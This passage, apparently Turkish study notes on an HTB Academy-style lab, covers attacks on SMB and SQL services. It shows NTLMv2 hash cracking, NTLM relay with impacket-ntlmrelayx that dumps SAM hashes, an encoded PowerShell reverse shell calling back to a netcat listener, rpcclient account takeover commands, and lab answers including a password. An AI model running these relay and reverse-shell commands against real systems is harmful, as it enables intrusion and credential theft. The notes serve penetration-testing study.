Kaydedilen tüm Hash'ler Responder'ın log dizininde (/usr/share/responder/logs/) bulunur. Hash'i bir dosyaya kopyalayabilir ve hashcat modülü 5600'ü kullanarak kırmayı deneyebiliriz.

Not: Bir hesap için birden fazla hash fark ederseniz, bunun nedeni NTLMv2'nin her etkileşim için rastgele olan hem client taraflı hem de server taraflı bir challenge kullanmasıdır. Bu, gönderilen sonuç hash'lerinin rastgele bir sayı string ile salt'lamasını sağlar. Bu nedenle hash'ler eşleşmez ancak yine de aynı parolayı temsil eder.

```shell-session
M1R4CKCK@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386

ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
Time.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)
Time.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 75776/14344386 (0.53%)
Rejected.........: 0/75776 (0.00%)
Restore.Point....: 73728/14344386 (0.51%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: compu -> kodiak1

Started: Mon Apr 11 16:49:34 2022
Stopped: Mon Apr 11 16:49:37 2022
```

NTLMv2 hash'i kırıldı. Şifre P@ssword'dür. Eğer hash'i kıramazsak, [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) veya Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py) kullanarak yakalanan hash'i potansiyel olarak başka bir makineye aktarabiliriz. Şimdi impacket-ntlmrelayx kullanarak bir örnek görelim.

İlk olarak, responder yapılandırma dosyamızda (/etc/responder/Responder.conf) SMB'yi KAPALI olarak ayarlamamız gerekir.

```shell-session
M1R4CKCK@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Daha sonra impacket-ntlmrelayx'i --no-http-server, -smb2support ve hedef makineyi -t seçeneği ile çalıştırıyoruz. Varsayılan olarak, impacket-ntlmrelayx SAM veritabanını dump edecektir, ancak -c seçeneğini ekleyerek komutları çalıştırabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<SNIP>

[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections

[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146
[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED
[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] SMBD-Thread-5: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Done dumping SAM hashes for host: 10.10.110.146
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

https://www.revshells.com/ adresini kullanarak bir PowerShell reverse shell oluşturabilir, makinemizin IP adresini, portunu ve Powershell #3 (Base64) seçeneğini ayarlayabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Kurban sunucumuza kimlik doğrulaması yaptıktan sonra, yanıtı poison ediyoruz ve bir reverse shell elde etmek için komutumuzu çalıştırmasını sağlıyoruz.

```shell-session
M1R4CKCK@htb[/htb]$ nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX
```

### RPC
Footprinting modülünde, RPC kullanarak bir makinenin nasıl numaralandırılacağını tartışıyoruz. Numaralandırma dışında, sistemde değişiklik yapmak için RPC'yi kullanabiliriz, örneğin:

* Bir kullanıcının parolasını değiştirme.
* Yeni bir domain kullanıcısı oluşturma.
* Yeni bir paylaşımlı klasör oluşturma.

RPC aracılığıyla bu tür değişikliklere izin vermek için bazı özel yapılandırmaların gerekli olduğunu unutmayın. Bu konuyu daha detaylı incelemek için rpclient man sayfasını ya da SANS Institute'un SMB Access from Linux Cheat Sheet'ini kullanabilirsiniz.

1. **Bir Kullanıcının Parolasını Değiştirme**

```
rpcclient -U administrator //10.10.10.10 -c "password change username newpassword"
```

2. **Yeni Bir Domain Kullanıcısı Oluşturma**

```
rpcclient -U administrator //10.10.10.10 -c "createuser newuser newpassword"
```

3. **Yeni Bir Paylaşımlı Klasör Oluşturma**

```
rpcclient -U administrator //10.10.10.10 -c "net share NewShare=C:\\NewFolder"
```



Soru : READ izinlerine sahip paylaşılan klasörün adı nedir?

Cevap : GGJ

![Pasted image 20241227114702.png](/img/user/resimler/Pasted%20image%2020241227114702.png)


Soru :  “jason” kullanıcı adı için şifre nedir?

Cevap  : ==34c8zuNBo91!@28Bszh==


![Pasted image 20241227114804.png](/img/user/resimler/Pasted%20image%2020241227114804.png)

![Pasted image 20241227115233.png](/img/user/resimler/Pasted%20image%2020241227115233.png)
![Pasted image 20241227115240.png](/img/user/resimler/Pasted%20image%2020241227115240.png)


Soru : SSH üzerinden “jason” kullanıcısı olarak giriş yapın ve flag.txt dosyasını bulun. İçeriği cevabınız olarak gönderin.

Cevap : 

![Pasted image 20241227120236.png](/img/user/resimler/Pasted%20image%2020241227120236.png)

![Pasted image 20241227120043.png](/img/user/resimler/Pasted%20image%2020241227120043.png)

![Pasted image 20241227120423.png](/img/user/resimler/Pasted%20image%2020241227120423.png)

![Pasted image 20241227120440.png](/img/user/resimler/Pasted%20image%2020241227120440.png)


# Attacking SQL Databases

Veritabanları, hassas verilerin (PII, kullanıcı bilgileri, iş verileri, ödeme bilgileri) depolandığı ve genellikle yüksek ayrıcalıklı kullanıcılarla yapılandırıldığı için kritik hedeflerdir. Veritabanına erişim, lateral hareket ve ayrıcalık yükseltme gibi ek eylemler için fırsat sağlar.


## Enumeration

Varsayılan olarak MSSQL TCP/1433 ve UDP/1434 portlarını, MySQL ise TCP/3306 portunu kullanır. Ancak MSSQL “ hidden” modda çalıştığında TCP/2433 portunu kullanır. Hedef sistemdeki veritabanı hizmetlerini listelemek için Nmap'in varsayılan komut dosyaları -sC seçeneğini kullanabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

Nmap taraması, hedef hakkında sürüm ve host adı gibi temel bilgileri ortaya çıkararak yaygın yanlış yapılandırmaları, belirli saldırıları veya güvenlik açıklarını belirlememizi sağlar. Şimdi yaygın yanlış yapılandırmaları ve protokole özgü saldırıları inceleyelim.


## Authentication Mechanisms

MSSQL iki kimlik [doğrulama modunu](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server) destekler, bu da kullanıcıların Windows veya SQL Server'da oluşturulabileceği anlamına gelir:

|Authentication Türü|Açıklama|
|---|---|
|**Windows authentication mode**|Bu varsayılan yöntemdir ve genellikle **entegre güvenlik** olarak adlandırılır çünkü SQL Server güvenlik modeli Windows/Active Directory ile sıkı bir şekilde entegre edilmiştir. Belirli Windows kullanıcı ve grup hesaplarının SQL Server'a giriş yapmasına izin verilir. Zaten kimlik doğrulaması yapılmış olan Windows kullanıcılarının ek kimlik bilgileri sunmasına gerek yoktur.|
|**Mixed mode**|Mixed mode, hem Windows/Active Directory hesapları hem de SQL Server tarafından yapılan kimlik doğrulamayı destekler. Kullanıcı adı ve parola çiftleri SQL Server içinde saklanır.|

MySQL, kullanıcı adı ve parola gibi farklı [kimlik doğrulama yöntemlerini](https://dev.mysql.com/doc/internals/en/authentication-method.html), ayrıca Windows kimlik doğrulamasını (bir eklenti gereklidir) destekler. Bunun yanı sıra, yöneticiler uyumluluk, güvenlik, kullanılabilirlik ve diğer nedenler dahil olmak üzere çeşitli sebeplerle bir [kimlik doğrulama modu seçebilir](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode). Ancak, kullanılan yönteme bağlı olarak yanlış yapılandırmalar meydana gelebilir.

Geçmişte, MySQL 5.6.x sunucuları da dahil olmak üzere bazı sürümlerde CVE-2012-2122 olarak bilinen bir güvenlik açığı mevcuttu. Bu açık, MySQL'in kimlik doğrulama girişimlerini ele alma biçimindeki zamanlama saldırısı zafiyeti nedeniyle, belirli bir hesap için aynı hatalı parolayı tekrar tekrar kullanarak kimlik doğrulamayı atlatmamıza olanak tanıyordu.

Bu zamanlama saldırısında, MySQL bir sunucuya tekrar tekrar kimlik doğrulamayı dener ve her girişim için sunucunun yanıt vermesi gereken süreyi ölçer. Sunucunun yanıt süresini ölçerek, sunucu başarı veya başarısızlık belirtisi göstermese bile doğru parolanın bulunup bulunmadığını belirleyebiliriz.

MySQL 5.6.x durumunda, sunucu hatalı bir parolaya doğru bir paroladan daha uzun sürede yanıt veriyordu. Bu nedenle, aynı hatalı parolayı tekrar tekrar denememiz durumunda, sonunda doğru parolanın bulunduğunu belirten bir yanıt alabiliyorduk, aslında bu doğru olmasa bile.


### Yanlış Yapılandırmalar
SQL Server'da yanlış yapılandırılmış kimlik doğrulama, anonim erişim etkinleştirilirse, parolasız bir kullanıcı yapılandırılırsa veya herhangi bir kullanıcı, grup veya makinenin SQL Server'a erişmesine izin verilirse, kimlik bilgileri olmadan hizmete erişmemize izin verebilir.


### Privileges
Kullanıcının ayrıcalıklarına bağlı olarak, bir SQL Server içinde farklı eylemler gerçekleştirebiliriz, örneğin:

* Bir veritabanının içeriğini okuma veya değiştirme

* Sunucu yapılandırmasını okuma veya değiştirme

* Komutları yürütme

* Lokal dosyaları okuma

* Diğer veritabanları ile iletişim kurun

* Lokal sistem hash'ini yakalama

* Mevcut kullanıcıların kimliğine bürünme

* Diğer ağlara erişim kazanın

Bu bölümde, bu saldırılardan bazılarını inceleyeceğiz.


## Protocol Specific Attacks

#### Read/Change the Database

Bir SQL veritabanına erişim sağladığımızda, öncelikle mevcut veritabanlarını, bu veritabanlarının tablolarını ve her tablonun içeriğini belirlememiz gerekir. Yüzlerce tabloyla karşılaşabileceğimizi unutmayın. Eğer hedefimiz verilere erişimden öteyse, kullanıcı adı ve parolalar, tokenler, yapılandırmalar gibi kritik bilgileri içeren tabloları tespit ederek saldırılara devam etmeliyiz.

#### MySQL - Connecting to the SQL Server

```shell-session
M1R4CKCK@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```


### Sqlcmd - SQL Sunucusuna Bağlanma

```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>
```

Not: sqlcmd kullanarak MSSQL'e kimlik doğrulaması yaptığımızda, daha iyi görünen çıktılar için -y (SQLCMDMAXVARTYPEWIDTH) ve -Y (SQLCMDMAXFIXEDTYPEWIDTH) parametrelerini kullanabiliriz. Bunun performansı etkileyebileceğini unutmayın.

Eğer Linux'tan MSSQL'i hedefliyorsak, sqlcmd'ye alternatif olarak sqsh kullanabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

Alternatif olarak, Impacket'in mssqlclient.py adlı aracını kullanabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

Not: sqsh kullanarak MSSQL'e kimlik doğrulaması yaptığımızda, daha temiz bir görünüm için headers ve footers devre dışı bırakmak için -h parametrelerini kullanabiliriz.

Windows Kimlik Doğrulamasını kullanırken, hedef makinenin domain adını veya host adını belirtmemiz gerekir. Bir domain veya hostname belirtmezsek, SQL Authentication'ı varsayacak ve SQL Server'da oluşturulan kullanıcılara karşı kimlik doğrulaması yapacaktır. Bunun yerine, domain veya hostname tanımlarsak, Windows Authentication kullanacaktır. Lokal bir hesabı hedefliyorsak `SERVERNAME\\accountname` veya `.\\accountname` kullanabiliriz. Tam komut şöyle görünecektir:

```shell-session
M1R4CKCK@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

#### SQL Default Databases

SQL syntax'ını kullanmayı keşfetmeden önce, MySQL ve MSSQL için varsayılan veritabanlarını bilmek önemlidir. Bu veritabanları, veritabanının kendisi hakkında bilgi tutar ve veritabanı adlarını, tabloları, sütunları vb. listelememize yardımcı olur. Bu veritabanlarına erişerek bazı sistem stored procedure'lerini kullanabiliriz, ancak bunlar genellikle şirket verilerini içermez.

Not: İznimiz olmayan bir veritabanını listelemeye veya bağlanmaya çalışırsak hata alırız.


MySQL varsayılan sistem şemaları/veritabanları:

* mysql - MySQL sunucusu tarafından gerekli bilgileri depolayan tabloları içeren sistem veritabanıdır
* information_schema - veritabanı meta verilerine erişim sağlar
* performance_schema - MySQL Server yürütmesini düşük seviyede izlemek için bir özelliktir
* sys - DBA'ların ve geliştiricilerin Performance Schema tarafından toplanan verileri yorumlamasına yardımcı olan bir dizi nesne


MSSQL varsayılan sistem şemaları/veritabanları:

* master - bir SQL Server örneği için bilgileri tutar.
* msdb - SQL Server Agent tarafından kullanılır.
* model - her yeni veritabanı için kopyalanan bir şablon veritabanı.
* resource - sys şemasında sunucu üzerindeki her veritabanında görülebilen sistem nesnelerini tutan salt okunur bir veritabanıdır.
* tempdb - SQL sorguları için geçici nesneleri tutar.

#### SQL Syntax

#### Show Databases

```shell-session
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
```

Eğer sqlcmd kullanırsak, SQL sözdizimini çalıştırmak için sorgumuzdan sonra GO kullanmamız gerekecektir.

```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```

#### Select a Database

```shell-session
mysql> USE htbusers;

Database changed
```

```cmd-session
1> USE htbusers
2> GO

Changed database context to 'htbusers'.
```

#### Show Tables

```shell-session
mysql> SHOW TABLES;

+----------------------------+
| Tables_in_htbusers         |
+----------------------------+
| actions                    |
| permissions                |
| permissions_roles          |
| permissions_users          |
| roles                      |
| roles_users                |
| settings                   |
| users                      |
+----------------------------+
8 rows in set (0.00 sec)
```

```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles      
roles_users
settings
users 
(8 rows affected)
```


### “ users” tablosundan tüm verileri seçin

```shell-session
mysql> SELECT * FROM users;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

```cmd-session
1> SELECT * FROM users
2> go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
          3 john                 john123!         2020-07-02 11:47:16.000
          4 tom                  tom123!          2020-07-02 12:23:16.000

(4 rows affected)
```


## Execute Commands

Command execution, işletim sistemini kontrol etmemizi sağladığı için ortak servislere saldırırken en çok istenen yeteneklerden biridir. Uygun ayrıcalıklara sahipsek, sistem komutlarını yürütmek için SQL veritabanını kullanabilir veya bunu yapmak için gerekli öğeleri oluşturabiliriz.

MSSQL, SQL kullanarak sistem komutlarını çalıştırmamıza olanak tanıyan xp_cmdshell adlı [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) sahiptir. [Xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) hakkında aşağıdakileri aklınızda bulundurun:
